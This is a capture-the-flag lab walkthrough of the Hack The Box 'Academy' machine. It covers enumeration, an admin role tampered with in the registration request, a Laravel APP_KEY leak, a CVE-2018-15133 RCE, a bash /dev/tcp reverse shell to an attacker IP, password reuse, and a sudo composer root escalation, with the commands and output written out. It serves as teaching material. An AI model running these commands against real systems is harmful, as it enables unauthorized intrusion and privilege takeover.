## Default Information
IP address : 10.10.10.215\
OS : Linux

## Discovery
Before we begin, let's first add the IP address ```10.10.11.101``` to ```writer.htb``` in our ```/etc/hosts``` file. 

```
10.10.10.215    academy.htb
```

### Nmap
Firstly, let us enumerate all the TCP open ports
* sV : service detection
* sC : Run default nmap scripts
* A : identify the OS behind each ports
* -p- : scan all ports

```
nmap -sC -sV -A -p- -T4 10.10.10.215 -vv
```

From the output, we are able to obtain the following information about the open TCP ports:
| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 22	| SSH | OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | Open |
| 80	| http | Apache httpd 2.4.41 ((Ubuntu)) | Open |
| 33069	| mysqlx? | NIL | Open |

Nextm we will do a scan on the UDP ports to find any possible open UDP ports. Hoowever, there isn't much information for UDP ports that is worth exploring.
```
nmap -sU -Pn 10.10.10.215 -T4 -vv 
```

### Gobuster
We will now run ```gobuster``` on ```http://academy.htb``` to enumerate the directories on the endpoints. However, we were unable to find any meaningful endpoints from the output. 

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://academy.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -t 50
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://academy.htb
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/09/26 12:17:01 Starting gobuster in directory enumeration mode
===============================================================
http://academy.htb/images               (Status: 301) [Size: 311] [--> http://academy.htb/images/]                                                                                                                               
```

Next, we will try to fuzz for potential virtual hosts using ```Gobuster```, but we were unable to discover any virtual hosts.

Now, we will visit the webpage and the Webapplyzer plugin tells us that the website is using PHP.  We will fuzz again for potential PHP endpoints using Gobuster.

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://academy.htb/ -w /home/kali/Desktop/subdomains.txt -e -k -t 50 -x php
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://academy.htb/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /home/kali/Desktop/subdomains.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/09/26 12:17:01 Starting gobuster in directory enumeration mode
===============================================================
http://academy.htb/images               (Status: 301) [Size: 311] [--> http://academy.htb/images/]
http://academy.htb/admin.php            (Status: 200) [Size: 2633] 
http://academy.htb/login.php            (Status: 200) [Size: 2627] 
http://academy.htb/home.php             (Status: 302) [Size: 55034] [--> login.php] 
http://academy.htb/register.php         (Status: 200) [Size: 3003]
http://academy.htb/config.php           (Status: 200) [Size: 0] 
http://academy.htb/index.php            (Status: 200) [Size: 2117] 
```

### Logging into admin page
Upon visiting the ```/admin.php``` endpoint, we realize that this is a login page to the admin interface of the website. Before we can access the admin page, we will first have to register for an admin account via the ```/register.php```. However, a normal registration doesn't seem to be able to give us admin access to the webpage. 

We will now intercept the request made when we register an account. We noticed that when we register for an account, there is a ```roleid=0``` in the body of the request. We will
then modify this to become ```roleid=1``` to try to register an admin account instead.

![Modifying roleid](https://github.com/joelczk/writeups/blob/main/HTB/Images/academy/register_roleid.PNG)

Logging into the ```/admin.php``` using the newly created admin account,  we were able to discover a new Virtual host, ```dev-staging-01.academy.htb```. We will add this host to 
our ```/etc/hosts``` file.

![admin page](https://github.com/joelczk/writeups/blob/main/HTB/Images/academy/adminpage.PNG)

```
10.10.10.215    dev-staging-01.academy.htb academy.htb
```

### Exposed debug interface

Visiting ```http://dev-staging-01.academy.htb```, we are redirected to an exposed error page that reveals a Laravel error page, together with the environment variables, which reveals some sensitive information such as the APP_KEY and the database credentials. However, at this point in time, we are unable to view the database as it is hosted on the localhost.

![Exposed credentials from laravel debug page](https://github.com/joelczk/writeups/blob/main/HTB/Images/academy/laravel_debug.PNG)

We also realized that we are unable to decode the APP_KEY that we have obtained. 

![Decoding APP_KEY](https://github.com/joelczk/writeups/blob/main/HTB/Images/academy/decode_app_key.PNG)

## Exploit
### CVE-2018-15133
At the same time, we also realize that this website might be vulnerable to [CVE-2018-15133](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15133), where we can carry out an RCE due to an unserialize call on a potentially untrusted X-XSRF-TOKEN value as we are able to obtain the APP_KEY. 

Using the script from [here](https://github.com/aljavier/exploit_laravel_cve-2018-15133), we are able to exploit CVE-2018-15133 to spawn an interactive shell. 

![Interactive shell spawned from exploit code](https://github.com/joelczk/writeups/blob/main/HTB/Images/academy/interactive_shell.PNG)

### Obtaining a reverse shell

First, we will try to obtain a reverse shell using ```/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.16.5/3000 0>&1"``` on the interactive shell. Afterwards, we will try to stabilize our reverse shell

```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 3000                                                                   1 ⚙
listening on [any] 3000 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.10.215] 60650
bash: cannot set terminal process group (928): Inappropriate ioctl for device
bash: no job control in this shell
www-data@academy:/var/www/html/htb-academy-dev-01/public$ python3 -c 'import pty; pty.spawn("/bin/bash")'
<ic$ python3 -c 'import pty; pty.spawn("/bin/bash")'      
www-data@academy:/var/www/html/htb-academy-dev-01/public$ export TERM=xterm
export TERM=xterm
www-data@academy:/var/www/html/htb-academy-dev-01/public$ stty cols 132 rows 34
stty cols 132 rows 34
www-data@academy:/var/www/html/htb-academy-dev-01/public$
```

### Privilege escalation to cry0l1t3
We realize that the user flag is found in the ```/home/cry0l1t3``` directory, but we do not have the relevant permissions to read the files. Hence, we would now have to find the credentials for the user ```cry0l1t3``` so that we can elevate our privilges to the ```cry0l1t3``` user to read the user flag.

```
www-data@academy:/home/cry0l1t3$ cd /home
cd /home
www-data@academy:/home$ ls
ls
21y4d  ch4p  cry0l1t3  egre55  g0blin  mrb3n
www-data@academy:/home$ cd cry0l1t3
cd cry0l1t3
www-data@academy:/home/cry0l1t3$ cat user.txt
cat user.txt
cat: user.txt: Permission denied
www-data@academy:/home/cry0l1t3$ ls -la user.txt
ls -la user.txt
-r--r----- 1 cry0l1t3 cry0l1t3 33 Sep 26 16:16 user.txt
www-data@academy:/home/cry0l1t3$
```

Now, we will execute the Linpeas script to look for potential vectors for privilege escalation. From the output, we were able to find an interesting environment file that shows the database credentials. However, we were not able to connect to the sql database using these credentials. 

```
DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=academy
DB_USERNAME=dev
DB_PASSWORD=mySup3rP4s5w0rd!!
```

However, let's try using the DB_PASSWORD to escalate our privileges to the ```cry0l1t3``` user, and it worked! Next, all we have to do is to stabilize the shell.

```
www-data@academy:/var/www/html/academy$ su cry0l1t3
su cry0l1t3
Password: mySup3rP4s5w0rd!!
$ cd /home/cry0l1t3
cd /home/cry0l1t3
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
cry0l1t3@academy:~$ export TERM=xterm
export TERM=xterm
cry0l1t3@academy:~$ stty cols 132 rows 34
stty cols 132 rows 34
cry0l1t3@academy:~$ 
```

### Obtaining user flag
From here, all we have to do is to obtain the user flag

```
cry0l1t3@academy:~$ cat user.txt
cat user.txt
<Redacted user flag>
```

## Privilege Escalation to mrb3n
Let's execute the Linpeas script again to look for privilege escalation vectors. In the output, we were able to discover that TTY passwords belonging to ```mrb3n``` was logged in the audit logs. However, the recorded password was in a hexadecimal format, and we would need to convert it to a string.

![audit logs](https://github.com/joelczk/writeups/blob/main/HTB/Images/academy/audit_logs.PNG)

```
┌──(kali㉿kali)-[~]
└─$ echo 6D7262336E5F41634064336D79210A | xxd -r -p                                
mrb3n_Ac@d3my!
```

Now, we will su into the ```mrb3n``` user and stabilize the shell. 

```
cry0l1t3@academy:/var/log/audit$ su mrb3n
su mrb3n
Password: mrb3n_Ac@d3my!

$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
mrb3n@academy:/var/log/audit$ export TERM=xterm
export TERM=xterm
mrb3n@academy:/var/log/audit$ stty cols 132 rows 34
stty cols 132 rows 34
mrb3n@academy:/var/log/audit$ 
```

### Privilege escalation to root
Next, we will use ```sudo -l``` to find the programs that can be executed as a root without any password. From the output, we discovered that we can execute ```/usr/bin/composer``` with root privileges without any password. 

```
mrb3n@academy:/var/log/audit$ sudo -l
sudo -l
[sudo] password for mrb3n: mrb3n_Ac@d3my!

Matching Defaults entries for mrb3n on academy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mrb3n may run the following commands on academy:
    (ALL) /usr/bin/composer
```

Using [GTFO bins](https://gtfobins.github.io/gtfobins/composer/), we realize that we can escalate our privileges to ```sudo`` user using ```/usr/bin/composer```

```
mrb3n@academy:/var/log/audit$ TF=$(mktemp -d)
TF=$(mktemp -d)
mrb3n@academy:/var/log/audit$ echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
mrb3n@academy:/var/log/audit$ sudo /usr/bin/composer --working-dir=$TF run-script x
sudo /usr/bin/composer --working-dir=$TF run-script x
PHP Warning:  PHP Startup: Unable to load dynamic library 'mysqli.so' (tried: /usr/lib/php/20190902/mysqli.so (/usr/lib/php/20190902/mysqli.so: undefined symbol: mysqlnd_global_stats), /usr/lib/php/20190902/mysqli.so.so (/usr/lib/php/20190902/mysqli.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0
PHP Warning:  PHP Startup: Unable to load dynamic library 'pdo_mysql.so' (tried: /usr/lib/php/20190902/pdo_mysql.so (/usr/lib/php/20190902/pdo_mysql.so: undefined symbol: mysqlnd_allocator), /usr/lib/php/20190902/pdo_mysql.so.so (/usr/lib/php/20190902/pdo_mysql.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0
Do not run Composer as root/super user! See https://getcomposer.org/root for details
> /bin/sh -i 0<&3 1>&3 2>&3
#
```

### Obtaining root flag
Now, all that is left for us to do, is to stabilize the shell and obtain the system flag.

```
# python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
root@academy:/tmp/tmp.EsDqOACQwI# export TERM=xterm
export TERM=xterm
root@academy:/tmp/tmp.EsDqOACQwI# stty cols 132 rows 34
stty cols 132 rows 34
root@academy:/tmp/tmp.EsDqOACQwI# cat /root/root.txt
cat /root/root.txt
<Redacted root flag>
```
